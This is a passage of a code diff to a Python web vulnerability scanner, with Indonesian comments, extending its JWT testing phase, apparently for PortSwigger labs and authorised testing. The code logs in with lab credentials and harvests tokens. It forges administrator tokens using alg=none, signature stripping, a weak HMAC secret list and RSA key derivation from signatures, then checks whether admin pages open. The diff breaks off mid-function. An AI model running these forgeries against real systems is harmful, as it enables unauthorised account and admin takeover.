@@ -4891,124 +4891,177 @@ class SatriaBaruScanner:
             sess.cookies.set(cookie_name, token or "")
         return sess
 
+    @staticmethod
+    def _jwt_tokens_in_text(value: Any) -> list[str]:
+        """Ambil token JWS kompak dari teks, HTML, JSON, header, dan nilai URL-encoded."""
+        import html as _html
+        from urllib.parse import unquote as _unquote
+
+        raw = str(value or "")
+        if not raw:
+            return []
+        candidates = [raw]
+        try:
+            decoded = _unquote(raw)
+            if decoded != raw:
+                candidates.append(decoded)
+        except Exception:
+            pass
+        try:
+            candidates.append(_html.unescape(raw))
+        except Exception:
+            pass
+        pattern = re.compile(
+            r"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{4,}\\.[A-Za-z0-9_-]{2,}\\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])"
+        )
+        found: list[str] = []
+        for candidate in candidates:
+            candidate = candidate.replace("\\\\u002e", ".").replace("\\\\/", "/")
+            if SatriaBaruScanner._jwt_decode(candidate.strip()):
+                found.append(candidate.strip())
+            found.extend(match.group(1) for match in pattern.finditer(candidate))
+        return list(dict.fromkeys(token for token in found if SatriaBaruScanner._jwt_decode(token)))
+
     def _jwt_login(self, pages: list[Page]) -> requests.Session | None:
-        """Login dengan kredensial lab pada form/endpoint yang benar-benar ada; sesi segar tiap panggilan."""
-        pu = urlparse(self.target_url)
-        origin = f"{pu.scheme}://{pu.netloc}"
-        forms: list[FormSpec] = []
+        """Gunakan sesi/token yang sudah ada; kredensial lab hanya dicoba pada lab PortSwigger."""
         self._jwt_login_artifacts = []
-        for pg in pages[:40]:
-            for form in getattr(pg, "forms", []) or []:
-                action = urljoin(getattr(form, "page_url", getattr(pg, "url", "")), getattr(form, "action", "") or "")
-                # Jangan kirim kredensial ke form GET atau endpoint di luar origin.
+        existing = self._jwt_collect_tokens(pages, self.session)
+        if existing:
+            return self.session
+
+        host = (urlparse(self.target_url).hostname or "").lower()
+        credentials: list[tuple[str, str]] = []
+        user = os.getenv("SATRIA_TEST_USERNAME", "").strip()
+        password = os.getenv("SATRIA_TEST_PASSWORD", "")
+        if user and password:
+            credentials.append((user, password))
+        if host.endswith("web-security-academy.net") or host.endswith("portswigger.net"):
+            credentials.append(("wiener", "peter"))
+        if not credentials:
+            return None
+
+        forms: list[FormSpec] = []
+        seen_actions: set[str] = set()
+        for page in pages[:60]:
+            for form in getattr(page, "forms", []) or []:
+                page_url = getattr(form, "page_url", "") or getattr(page, "url", "")
+                action = urljoin(page_url or self.target_url, getattr(form, "action", "") or "")
                 if str(getattr(form, "method", "")).lower() != "post" or not self._same_origin(action):
                     continue
-                names = [str(n).lower() for n, _v, _t in getattr(form, "fields", ())]
-                if any(n in names for n in ("username", "user", "email", "login")) and \
-                   any(n in names for n in ("password", "pass", "pwd")):
-                    forms.append(FormSpec(form.page_url, action, form.method, form.fields, form.has_password))
-        forms.append(FormSpec(urljoin(origin + "/", "login"), urljoin(origin + "/", "login"), "POST", (), False))
-        for form in forms[:5]:
-            sess = self._jwt_anon_session()
-            # Ambil halaman tempat form dirender (bukan endpoint POST-nya).
-            page = self._request("GET", form.page_url, session=sess, allow_redirects=True)
-            if page.error:
-                continue
-            names = [str(n) for n, _v, _t in form.fields]
-            uf = next((n for n in names if n.lower() in ("username", "user", "email", "login")), "username")
-            pf = next((n for n in names if n.lower() in ("password", "pass", "pwd")), "password")
-            data = {n: v for n, v, _t in form.fields}
-            data.update(self._ac_csrf(page.text or ""))
-            data[uf] = "wiener"
-            data[pf] = "peter"
-            r = self._request(form.method.upper() or "POST", form.action, session=sess,
-                              data=data, allow_redirects=True)
-            if r.error:
-                continue
-            self._jwt_login_artifacts.append({"url": form.action, "text": r.text or "", "headers": dict(r.headers or {})})
-            if any(self._jwt_decode(c.value) for c in sess.cookies if c.value):
-                return sess
-            token_pattern = r'(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])'
-            token = next((candidate for candidate in re.findall(token_pattern, r.text or "")
-                          if self._jwt_decode(candidate)), None)
-            if token:
-                sess.headers["Authorization"] = "Bearer " + token
-                return sess
-            for header_name, header_value in (r.headers or {}).items():
-                if str(header_name).lower() == "authorization":
-                    match = re.search(token_pattern, str(header_value or ""))
-                    if match and self._jwt_decode(match.group(1)):
-                        sess.headers["Authorization"] = "Bearer " + match.group(1)
-                        return sess
-            low = (r.text or "").lower()
-            if "log out" in low or "logout" in low or "my account" in low:
-                return sess
+                names = [str(name).strip().lower() for name, _value, _kind in getattr(form, "fields", ())]
+                user_fields = [name for name in names if
+                               name in ("username", "user", "email", "login", "identifier",
+                                        "user_name", "email_address", "loginid")
+                               or re.search(r"(user|email|login|identity)", name)]
+                pass_fields = [name for name in names if
+                               name in ("password", "pass", "pwd", "passwd", "passphrase")
+                               or "password" in name or name.endswith("_pass")]
+                if not user_fields or not pass_fields or action in seen_actions:
+                    continue
+                seen_actions.add(action)
+                forms.append(FormSpec(page_url, action, "POST", tuple(form.fields), True))
+
+        for form in forms[:6]:
+            for username, password in credentials:
+                if not self._within_budget():
+                    return None
+                sess = self._jwt_anon_session()
+                page = self._request("GET", form.page_url, session=sess, allow_redirects=True)
+                if page.error:
+                    continue
+                data = {str(name): value for name, value, _kind in form.fields}
+                data.update(self._ac_csrf(page.text or ""))
+                names = list(data)
+                user_field = next((name for name in names if
+                                   name.lower() in ("username", "user", "email", "login", "identifier",
+                                                    "user_name", "email_address", "loginid")
+                                   or re.search(r"(user|email|login|identity)", name.lower())), None)
+                pass_field = next((name for name in names if
+                                   name.lower() in ("password", "pass", "pwd", "passwd", "passphrase")
+                                   or "password" in name.lower() or name.lower().endswith("_pass")), None)
+                if not user_field or not pass_field:
+                    continue
+                data[user_field] = username
+                data[pass_field] = password
+                response = self._request(
+                    form.method.upper() or "POST", form.action, session=sess,
+                    data=data, allow_redirects=True,
+                )
+                if response.error:
+                    continue
+                artifact = {
+                    "url": form.action, "text": response.text or "",
+                    "headers": dict(response.headers or {}),
+                }
+                self._jwt_login_artifacts.append(artifact)
+                if any(self._jwt_decode(cookie.value) for cookie in sess.cookies if cookie.value):
+                    return sess
+                candidate_tokens = self._jwt_tokens_in_text(response.text or "")
+                candidate_tokens += self._jwt_tokens_in_text(response.headers or {})
+                if candidate_tokens:
+                    sess.headers["Authorization"] = "Bearer " + candidate_tokens[0]
+                    return sess
+                low = (response.text or "").lower()
+                if any(term in low for term in ("log out", "logout", "my account", "your account", "welcome back")):
+                    return sess
         return None
 
     def _jwt_collect_tokens(self, pages: list[Page], sess: requests.Session | None) -> list[tuple[str, str, str]]:
         found: list[tuple[str, str, str]] = []
+        seen: set[str] = set()
 
-        def add(tok: str, loc: str, name: str) -> None:
-            if not tok or tok in [f[0] for f in found]:
-                return
-            if self._jwt_decode(tok) is None:
-                return
-            found.append((tok, loc, name))
+        def add(token: str, location: str, name: str) -> None:
+            token = str(token or "").strip().strip('"').strip("'")
+            if token and token not in seen and self._jwt_decode(token) is not None:
+                seen.add(token)
+                found.append((token, location, name))
 
-        for cookie in (sess.cookies if sess is not None else []):
-            add(cookie.value, "cookie", cookie.name)
-        for cookie in self.session.cookies:
-            add(cookie.value, "cookie", cookie.name)
-        # Kompak JWT tidak selalu diawali "eyJ"; seluruh kandidat divalidasi
-        # dengan decoder JSON header/payload sebelum dipakai.
-        token_pattern = r'(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])'
-        targets = [self.target_url]
-        targets += [getattr(p, "url", "") for p in pages[:10] if getattr(p, "url", "")]
-        for u in targets[:8]:
-            if not self._within_budget():
-                break
-            r = self._request("GET", u, session=sess or self.session, allow_redirects=True)
-            if r.error:
+        def harvest(value: Any, location: str, name: str) -> None:
+            for token in self._jwt_tokens_in_text(value):
+                add(token, location, name)
+
+        for source_name, source in (("login", sess), ("scanner-session", self.session)):
+            if source is None:
                 continue
-            blob = str(r.headers.get("Set-Cookie", "") or "") + "\n" + str(r.headers.get("set-cookie", "") or "")
-            for m in re.finditer(r'([A-Za-z0-9_\-]+)=([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)', blob):
-                add(m.group(2), "cookie", m.group(1))
-            for m in re.finditer(token_pattern, r.text or ""):
-                add(m.group(1), "response", "session")
-        # Snapshot cookie, HTML, JavaScript, dan header dari crawler.
-        for pg in pages[:30]:
-            for cookie_name, cookie_value in (getattr(pg, "cookie_names", {}) or {}).items():
-                add(cookie_value, "cookie", cookie_name)
-            blob = (getattr(pg, "text", "") or "") + "\n" + (getattr(pg, "js_text", "") or "")
-            for m in re.finditer(token_pattern, blob):
-                add(m.group(1), "page", "session")
-            for header_name, header_value in (getattr(pg, "headers", {}) or {}).items():
-                if str(header_name).lower() in ("authorization", "set-cookie"):
-                    for m in re.finditer(token_pattern, str(header_value or "")):
-                        add(m.group(1), "header", str(header_name))
+            for cookie in source.cookies:
+                harvest(cookie.value, "cookie", cookie.name)
+            for header_name, header_value in source.headers.items():
+                if str(header_name).lower() in ("authorization", "x-auth-token", "x-access-token"):
+                    harvest(header_value, "header", str(header_name))
+
+        # Token dapat muncul pada Set-Cookie, Authorization, HTML, konfigurasi JS,
+        # localStorage bootstrap, atau JSON yang dikirim crawler.
+        for page in pages[:60]:
+            for cookie_name, cookie_value in (getattr(page, "cookie_names", {}) or {}).items():
+                harvest(cookie_value, "cookie", str(cookie_name))
+            for header_name, header_value in (getattr(page, "headers", {}) or {}).items():
+                if str(header_name).lower() in (
+                    "authorization", "set-cookie", "www-authenticate",
+                    "x-auth-token", "x-access-token",
+                ):
+                    harvest(header_value, "header", str(header_name))
+            harvest(getattr(page, "text", ""), "page", getattr(page, "url", ""))
+            harvest(getattr(page, "js_text", ""), "javascript", getattr(page, "url", ""))
+
         for artifact in getattr(self, "_jwt_login_artifacts", []) or []:
-            blob = str(artifact.get("text") or "")
-            for m in re.finditer(token_pattern, blob):
-                add(m.group(1), "login-response", "login")
-            for header_name, header_value in (artifact.get("headers") or {}).items():
-                if str(header_name).lower() in ("authorization", "set-cookie"):
-                    for m in re.finditer(token_pattern, str(header_value or "")):
-                        add(m.group(1), "header", str(header_name))
+            harvest(artifact.get("text", ""), "login-response", str(artifact.get("url", "login")))
+            harvest(artifact.get("headers", {}), "header", "login-response")
         return found
 
     @classmethod
     def _jwt_rsa_pem_from_tokens(cls, tokens: list[str]) -> tuple[str, str] | None:
-        """Derive public key RSA dari dua token RS* (teknik rsa_sign2n untuk lab 154)."""
+        """Derive RSA public modulus from two RS* JWTs (PortSwigger lab 154)."""
         prefixes = {
             "sha256": bytes.fromhex("3031300d060960864801650304020105000420"),
             "sha384": bytes.fromhex("3041300d060960864801650304020205000430"),
             "sha512": bytes.fromhex("3051300d060960864801650304020305000440"),
         }
-        ems: list[int] = []
-        sigs: list[int] = []
-        e = 65537
-        for tok in tokens[:6]:
-            parts = str(tok).split(".")
+        encoded_messages: list[int] = []
+        signatures: list[int] = []
+        algorithms: list[str] = []
+        exponent = 65537
+        for token in tokens:
+            parts = str(token).split(".")
             if len(parts) != 3:
                 continue
             try:
@@ -5016,402 +5069,602 @@ class SatriaBaruScanner:
                 alg = str(header.get("alg", "")).upper()
                 if alg not in ("RS256", "RS384", "RS512"):
                     continue
-                sig = cls._jwt_b64d(parts[2])
-                digest = hashlib.new({"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}[alg],
-                                     f"{parts[0]}.{parts[1]}".encode()).digest()
+                signature = cls._jwt_b64d(parts[2])
+                digest_name = {"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}[alg]
+                digest = hashlib.new(digest_name, f"{parts[0]}.{parts[1]}".encode()).digest()
+                digest_info = prefixes[digest_name] + digest
             except Exception:
                 continue
-            t = prefixes[{"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}[alg]] + digest
-            if len(sig) < len(t) + 11:
+            if len(signature) < len(digest_info) + 11:
                 continue
-            em = b"\x00\x01" + b"\xff" * (len(sig) - 3 - len(t)) + b"\x00" + t
-            ems.append(int.from_bytes(em, "big"))
-            sigs.append(int.from_bytes(sig, "big"))
-            if len(ems) >= 2:
+            encoded = b"\\x00\\x01" + b"\\xff" * (len(signature) - 3 - len(digest_info)) + b"\\x00" + digest_info
+            encoded_messages.append(int.from_bytes(encoded, "big"))
+            signatures.append(int.from_bytes(signature, "big"))
+            algorithms.append(alg)
+            if len(signatures) >= 3:
                 break
-        if len(ems) < 2:
+        if len(signatures) < 2:
             return None
+
         try:
             try:
                 import gmpy2  # type: ignore
+                gcd = lambda a, b: int(gmpy2.gcd(gmpy2.mpz(a), gmpy2.mpz(b)))
             except Exception:
-                return None  # tanpa gmpy2, gcd bilangan 134M-bit tidak layak secara waktu
-            g = int(gmpy2.gcd(gmpy2.mpz(sigs[0]) ** e - ems[0], gmpy2.mpz(sigs[1]) ** e - ems[1]))
+                import math
+                # Python big integers can derive the same gcd without a mandatory
+                # native dependency. Bound work to the common RSA JWT key sizes.
+                if len(signatures) > 2:
+                    pairs = [(0, 1), (0, 2), (1, 2)]
+                else:
+                    pairs = [(0, 1)]
+                gcd = math.gcd
+
+            candidates: list[int] = []
+            for left, right in pairs:
+                a = pow(signatures[left], exponent) - encoded_messages[left]
+                b = pow(signatures[right], exponent) - encoded_messages[right]
+                candidate = gcd(a, b)
+                for prime in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97):
+                    while candidate > 1 and candidate % prime == 0:
+                        candidate //= prime
+                if 1024 <= candidate.bit_length() <= 8192:
+                    candidates.append(candidate)
+            if not candidates:
+                return None
+            modulus = max(candidates, key=lambda value: value.bit_length())
         except Exception:
             return None
-        for p in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97):
-            while g % p == 0:
-                g //= p
-        for candidate in (g,):
-            if candidate.bit_length() < 1024 or candidate.bit_length() > 8192:
-                continue
-            n = candidate
-            if any(pow(s, e, n) != em for s, em in zip(sigs, ems)):
-                continue
-            try:
-                from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
-                from cryptography.hazmat.primitives import serialization as _ser
-                key = _rsa.RSAPublicNumbers(e, n).public_key()
-                x509 = key.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
-                pkcs1 = key.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.PKCS1).decode()
-                return x509, pkcs1
-            except Exception:
-                return None
-        return None
+
+        if any(pow(signature, exponent, modulus) != encoded
+               for signature, encoded in zip(signatures, encoded_messages)):
+            return None
+        try:
+            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+            from cryptography.hazmat.primitives import serialization as _ser
+            public_key = _rsa.RSAPublicNumbers(exponent, modulus).public_key()
+            x509 = public_key.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
+            pkcs1 = public_key.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.PKCS1).decode()
+            return x509, pkcs1
+        except Exception:
+            return None
 
     def phase_jwt(self, pages: list[Page], points: list[Point]) -> None:
         if not self._within_budget():
             return
-        # JWT needs login, token discovery, anonymous baselines and several
-        # independent validation requests. Keep this allowance local to JWT.
+        # JWT needs its own category allowance; the global non-SQL default is
+        # intentionally small and otherwise prevents the 8 JWT techniques running.
         if isinstance(self._scan_progress, dict):
             self._scan_progress["request_limit"] = max(
-                int(self._scan_progress.get("request_limit", self.non_sql_category_request_limit)), 80
+                int(self._scan_progress.get("request_limit", self.non_sql_category_request_limit)), 120
             )
-        pu = urlparse(self.target_url)
-        origin = f"{pu.scheme}://{pu.netloc}"
+
+        parsed_target = urlparse(self.target_url)
+        origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
         auth = self._jwt_login(pages)
         tokens = self._jwt_collect_tokens(pages, auth)
         if not tokens:
             return
 
-        # endpoint terlindungi: halaman akun + panel admin
         account_urls: list[str] = []
-        seen: set[str] = set()
-        for pg in pages[:30]:
-            u = getattr(pg, "url", "") or ""
-            if not u or u in seen:
-                continue
-            ul = u.lower()
-            if any(k in ul for k in ("my-account", "account", "profile", "dashboard", "settings", "/me")):
-                seen.add(u)
-                account_urls.append(u)
-        for path in ("/my-account", "/account", "/profile", "/dashboard"):
-            u = urljoin(origin + "/", path.lstrip("/"))
-            if u not in seen:
-                seen.add(u)
-                account_urls.append(u)
+        seen_urls: set[str] = set()
+
+        def add_url(collection: list[str], url: str) -> None:
+            if not url or not self._same_origin(url):
+                return
+            clean = url.split("#", 1)[0]
+            if clean not in seen_urls:
+                seen_urls.add(clean)
+                collection.append(clean)
+
+        for page in pages[:60]:
+            url = getattr(page, "url", "") or ""
+            low = url.lower()
+            if any(term in low for term in (
+                "my-account", "account", "profile", "dashboard", "settings",
+                "/me", "/user", "/customer",
+            )):
+                add_url(account_urls, url)
+        for point in points[:100]:
+            url = getattr(point, "url", "") or ""
+            descriptor = " ".join((
+                url, str(getattr(point, "name", "")),
+                str(getattr(point, "label", "")),
+            )).lower()
+            if any(term in descriptor for term in ("account", "profile", "user", "customer", "session", "/me")):
+                add_url(account_urls, url)
+
+        for path in (
+            "/my-account", "/account", "/profile", "/dashboard",
+            "/api/me", "/api/account", "/api/profile", "/api/user",
+            "/user/profile", "/customer/profile",
+        ):
+            add_url(account_urls, urljoin(origin + "/", path.lstrip("/")))
+
         admin_urls: list[str] = []
         try:
-            admin_urls = [u for u in self._ac_admin_urls(pages, origin) if self._same_origin(u)][:4]
+            for url in self._ac_admin_urls(pages, origin):
+                if len(admin_urls) >= 6:
+                    break
+                add_url(admin_urls, url)
         except Exception:
-            admin_urls = []
-        use_urls = account_urls[:2] + admin_urls[:3]
+            pass
+        # PortSwigger JWT labs use /admin. Keep direct same-origin probes even
+        # when the crawler did not discover the route in HTML/JavaScript.
+        for path in (
+            "/admin", "/admin/", "/administrator", "/admin-panel",
+            "/api/admin", "/api/admin/users", "/admin/users",
+        ):
+            add_url(admin_urls, urljoin(origin + "/", path.lstrip("/")))
+
+        use_urls = list(dict.fromkeys(account_urls[:3] + admin_urls[:5]))[:8]
+        if not use_urls:
+            return
 
         anon_map: dict[str, Response] = {}
-        for u in use_urls:
+        for url in use_urls:
             if not self._within_budget():
                 break
-            anon_map[u] = self._request("GET", u, session=self._jwt_anon_session(), allow_redirects=True)
+            anon_map[url] = self._request(
+                "GET", url, session=self._jwt_anon_session(), allow_redirects=True
+            )
 
         own_identity = ""
-        own_page = None
-        if auth is not None and account_urls:
-            own_page = self._request("GET", account_urls[0], session=auth, allow_redirects=True)
+        if auth is not None and account_urls and self._within_budget():
+            own_page = self._request(
+                "GET", account_urls[0], session=auth, allow_redirects=True
+            )
             if own_page and not own_page.error:
                 own_identity = self._jwt_identity(own_page.text or "")
 
-        def verdict(url: str, resp: Response | None) -> str | None:
-            if resp is None or resp.error or resp.status != 200:
+        def verdict(url: str, response: Response | None) -> str | None:
+            if response is None or response.error or response.status not in (200, 201, 202):
                 return None
-            txt = resp.text or ""
-            low = txt.lower()
-            base = anon_map.get(url)
-            btxt = (base.text or "") if base else ""
-            blow = btxt.lower()
-            if self._ac_admin_text(txt) and not self._ac_admin_text(btxt):
-                return "panel admin terbuka"
-            ident = self._jwt_identity(txt)
-            if ident and ident.lower() not in blow and (not own_identity or ident.lower() != own_identity.lower()):
-                return f"identitas berubah menjadi {ident}"
-            if ident and not self._jwt_identity(btxt):
-                return f"akses halaman akun sebagai {ident}"
-            if ("log out" in low or "logout" in low) and \
-               (not base or (base.status or 0) in (301, 302, 401, 403) or "log in" in blow or "login" in blow):
-                return "halaman terautentikasi"
+            text = response.text or ""
+            low = text.lower()
+            baseline = anon_map.get(url)
+            baseline_text = (baseline.text or "") if baseline else ""
+            baseline_low = baseline_text.lower()
+
+            if self._ac_admin_text(text) and not self._ac_admin_text(baseline_text):
+                return "konten panel admin terbuka"
+            identity = self._jwt_identity(text)
+            baseline_identity = self._jwt_identity(baseline_text)
+            if identity and identity.lower() != baseline_identity.lower():
+                if not own_identity or identity.lower() != own_identity.lower():
+                    return f"identitas akun berubah menjadi {identity}"
+            auth_markers = ("log out", "logout", "sign out", "my account", "your account")
+            if any(marker in low for marker in auth_markers) and not any(
+                marker in baseline_low for marker in auth_markers
+            ):
+                return "konten sesi terautentikasi terbuka"
             return None
 
-        def denied(resp: Response | None) -> bool:
-            if resp is None or resp.error:
-                return True
-            if resp.status in (301, 302, 303, 307, 308, 401, 403, 404):
-                return True
-            low = (resp.text or "").lower()
-            return any(k in low for k in ("log in", "login", "sign in", "not authorized", "forbidden",
-                                          "access denied", "unauthorized", "not found"))
-
         def get_with(token: str, url: str, mode: str, cookie_name: str) -> Response:
-            sess = self._jwt_anon_session()
-            headers = {}
+            session = self._jwt_anon_session()
+            headers: dict[str, str] = {}
             if mode == "cookie":
-                sess.cookies.set(cookie_name or "session", token)
+                session.cookies.set(cookie_name or "session", token)
             else:
                 headers["Authorization"] = "Bearer " + token
-            return self._request("GET", url, session=sess, headers=headers, allow_redirects=True)
+            return self._request(
+                "GET", url, session=session, headers=headers, allow_redirects=True
+            )
 
-        def confirm(num: int, forged: str | None, label: str, method_name: str,
-                    control: str | None = None, allow_control_accept: bool = False) -> bool:
-            if num in self._confirmed or not forged:
+        def confirm(
+            number: int, forged: str | None, label: str, method_name: str,
+            *, control: str | None = None, allow_control_accept: bool = False,
+        ) -> bool:
+            if number in self._confirmed or not forged:
                 return False
             for url in use_urls:
-                if num in self._confirmed or not self._within_budget():
+                if number in self._confirmed or not self._within_budget():
                     break
                 for mode in ("cookie", "bearer"):
-                    resp = get_with(forged, url, mode, cookie_name)
-                    tag = verdict(url, resp)
+                    if not self._within_budget():
+                        break
+                    response = get_with(forged, url, mode, cookie_name)
+                    tag = verdict(url, response)
                     if not tag:
                         continue
-                    if control is not None:
-                        ctrl_resp = get_with(control, url, mode, cookie_name)
-                        ctrl_tag = verdict(url, ctrl_resp)
-                        if ctrl_tag and not allow_control_accept:
-                            continue  # kontrol juga diterima: teknik tidak terbukti, hindari false positive
-                        if ctrl_tag and allow_control_accept:
-                            tag += "; token bertanda tangan salah juga diterima (signature diabaikan)"
-                    self._jwt_mark(num, url,
-                                   f"JWT bypass ({label}) terverifikasi pada {url} via {mode}: {tag} "
-                                   f"(HTTP {resp.status}); kontrol negatif ditolak/terbukti tidak berlaku.",
-                                   method_name)
+                    control_tag = None
+                    if control:
+                        control_response = get_with(control, url, mode, cookie_name)
+                        control_tag = verdict(url, control_response)
+                    if control_tag and not allow_control_accept:
+                        continue
+                    if control_tag:
+                        tag += "; token kontrol dengan signature tidak valid juga diterima"
+                    self._jwt_mark(
+                        number, url,
+                        f"JWT bypass ({label}) terverifikasi pada {url} via {mode}: {tag} "
+                        f"(HTTP {response.status}); hasil dibandingkan dengan sesi anonim dan kontrol negatif.",
+                        method_name,
+                    )
                     return True
             return False
 
-        for token, loc, name in tokens[:5]:
-            dec = self._jwt_decode(token)
-            if not dec or not self._within_budget():
+        for token, location, cookie_name in tokens[:6]:
+            if not self._within_budget():
+                break
+            decoded = self._jwt_decode(token)
+            if not decoded:
                 continue
-            header = dict(dec["header"] or {})
-            payload = dict(dec["payload"] or {})
-            parts = dec["parts"]
-            cookie_name = name if loc == "cookie" and name else "session"
-            alg = str(header.get("alg", "")).upper()
-            rand_key = ("satria-jwt-" + uuid.uuid4().hex).encode()
+            header = dict(decoded["header"] or {})
+            payload = dict(decoded["payload"] or {})
+            parts = decoded["parts"]
+            cookie_name = cookie_name if location == "cookie" and cookie_name else "session"
+            algorithm = str(header.get("alg", "")).upper()
+            random_key = ("satria-jwt-" + uuid.uuid4().hex).encode()
 
             forged_payload = dict(payload)
-            for claim in ("sub", "username", "user", "role", "admin", "isAdmin", "name"):
+            changed = False
+            for claim in ("sub", "username", "user", "login", "preferred_username"):
                 if claim in forged_payload:
-                    if isinstance(forged_payload[claim], bool):
-                        forged_payload[claim] = True
-                    elif isinstance(forged_payload[claim], (int, float)):
-                        forged_payload[claim] = 0
-                    elif isinstance(forged_payload[claim], str):
-                        forged_payload[claim] = "administrator"
-            if not any(k in forged_payload for k in ("sub", "username", "role", "admin", "isAdmin")):
+                    forged_payload[claim] = "administrator"
+                    changed = True
+            for claim in ("role", "user_role"):
+                if claim in forged_payload:
+                    forged_payload[claim] = "admin"
+                    changed = True
+            for claim in ("roles", "groups"):
+                if claim in forged_payload:
+                    old_value = forged_payload[claim]
+                    forged_payload[claim] = ["admin"] if isinstance(old_value, list) else "admin"
+                    changed = True
+            for claim in ("admin", "isAdmin", "is_admin", "administrator"):
+                if claim in forged_payload:
+                    forged_payload[claim] = True
+                    changed = True
+            if not changed:
                 forged_payload["sub"] = "administrator"
 
-            ctrl_payload = self._jwt_sign(header, forged_payload, key=rand_key)
+            now = int(time.time())
+            if "exp" in forged_payload:
+                forged_payload["exp"] = now + 3600
+            if "nbf" in forged_payload:
+                forged_payload["nbf"] = now - 5
+            control_token = self._jwt_sign(header, forged_payload, key=random_key)
 
-            # 147 unverified signature: payload diubah, signature asli / signature acak
+            # 147: perubahan claim dengan signature lama atau acak.
             if 147 not in self._confirmed and self._within_budget():
-                h2 = dict(header)
-                keep_sig = f"{self._jwt_b64e(json.dumps(h2, separators=(',', ':')).encode())}." \
-                           f"{self._jwt_b64e(json.dumps(forged_payload, separators=(',', ':')).encode())}.{parts[2]}"
-                resigned = self._jwt_sign(h2, forged_payload, key=rand_key)
-                for cand, label in ((keep_sig, "payload diubah, signature asli dipertahankan"),
-                                    (resigned, "payload diubah, signature acak")):
-                    if 147 in self._confirmed:
+                header_same = dict(header)
+                keep_signature = (
+                    f"{self._jwt_b64e(json.dumps(header_same, separators=(',', ':')).encode())}."
+                    f"{self._jwt_b64e(json.dumps(forged_payload, separators=(',', ':')).encode())}."
+                    f"{parts[2]}"
+                )
+                random_signature = self._jwt_sign(header_same, forged_payload, key=random_key)
+                for candidate, description in (
+                    (keep_signature, "payload diubah tetapi signature asli dipertahankan"),
+                    (random_signature, "payload diubah dan signature diganti acak"),
+                ):
+                    if 147 in self._confirmed or not self._within_budget():
                         break
-                    confirm(147, cand, label, "jwt_unverified_signature",
-                            control=ctrl_payload, allow_control_accept=True)
+                    confirm(
+                        147, candidate, description, "jwt_unverified_signature",
+                        control=control_token, allow_control_accept=True,
+                    )
 
-            # 148 flawed signature verification: alg none
+            # 148: alg=none / unsigned JWT (uji varian kapitalisasi yang umum).
             if 148 not in self._confirmed and self._within_budget():
-                for none_alg in ("none", "None", "NONE"):
-                    if 148 in self._confirmed:
+                for none_algorithm in ("none", "None", "NONE"):
+                    if 148 in self._confirmed or not self._within_budget():
                         break
-                    h2 = dict(header)
-                    h2["alg"] = none_alg
-                    unsigned = self._jwt_sign(h2, forged_payload, alg="NONE")
+                    unsigned_header = dict(header)
+                    unsigned_header["alg"] = none_algorithm
+                    unsigned = self._jwt_sign(unsigned_header, forged_payload, alg="NONE")
                     if unsigned:
-                        confirm(148, unsigned, f"alg={none_alg} tanpa signature",
-                                "jwt_flawed_signature", control=ctrl_payload)
+                        confirm(
+                            148, unsigned, f"alg={none_algorithm} dengan signature kosong",
+                            "jwt_flawed_signature", control=control_token,
+                        )
 
-            # 149 weak signing key (offline verification lalu forge)
-            if 149 not in self._confirmed and self._within_budget() and alg.startswith("HS"):
-                weak_keys = ["secret", "secret1", "secret123", "password", "password1", "admin", "key",
-                             "jwt", "jwtsecret", "changeme", "qwerty", "letmein", "welcome", "123456",
-                             "12345678", "s3cr3t", "Secret", "SECRET", "supersecret", "mysecret",
-                             "your-256-bit-secret", "development", "dev", "test", "satria", ""]
+            # 149: weak HMAC key. Verify directly with HMAC so expired claims do not
+            # mask a correct secret; the key list includes PortSwigger's secret1.
+            if 149 not in self._confirmed and self._within_budget() and algorithm in (
+                "HS256", "HS384", "HS512",
+            ):
+                import hmac
+                digest_function = {
+                    "HS256": hashlib.sha256, "HS384": hashlib.sha384,
+                    "HS512": hashlib.sha512,
+                }[algorithm]
+                signing_input = f"{parts[0]}.{parts[1]}".encode()
                 try:
-                    import jwt as pyjwt
+                    signature = self._jwt_b64d(parts[2])
                 except Exception:
-                    pyjwt = None
-                if pyjwt is not None:
-                    for weak in weak_keys:
-                        if 149 in self._confirmed or not self._within_budget():
-                            break
-                        try:
-                            pyjwt.decode(token, weak, algorithms=[alg])
-                        except Exception:
-                            continue
-                        forged = self._jwt_sign(header, forged_payload, key=weak, alg=alg)
-                        if confirm(149, forged, f"key lemah {weak!r}", "jwt_weak_signing_key",
-                                   control=ctrl_payload):
-                            break
+                    signature = b""
+                weak_keys = (
+                    "secret1", "secret", "password", "password1", "admin",
+                    "jwtsecret", "jwt", "changeme", "qwerty", "letmein",
+                    "welcome", "123456", "12345678", "s3cr3t",
+                    "your-256-bit-secret", "development", "dev", "test",
+                    "satria", "secret123", "supersecret", "mysecret",
+                )
+                for weak_key in weak_keys:
+                    if 149 in self._confirmed or not self._within_budget():
+                        break
+                    expected = hmac.new(weak_key.encode(), signing_input, digest_function).digest()
+                    if not hmac.compare_digest(expected, signature):
+                        continue
+                    forged = self._jwt_sign(header, forged_payload, key=weak_key, alg=algorithm)
+                    confirm(
+                        149, forged, f"secret HMAC lemah {weak_key!r}",
+                        "jwt_weak_signing_key", control=control_token,
+                    )
+                    break
 
-            # 150 jwk header injection
+            # 150: trust of an attacker-supplied JWK. JWK kid and JWT kid must
+            # match, because many implementations select an embedded key by kid.
             if 150 not in self._confirmed and self._within_budget():
                 try:
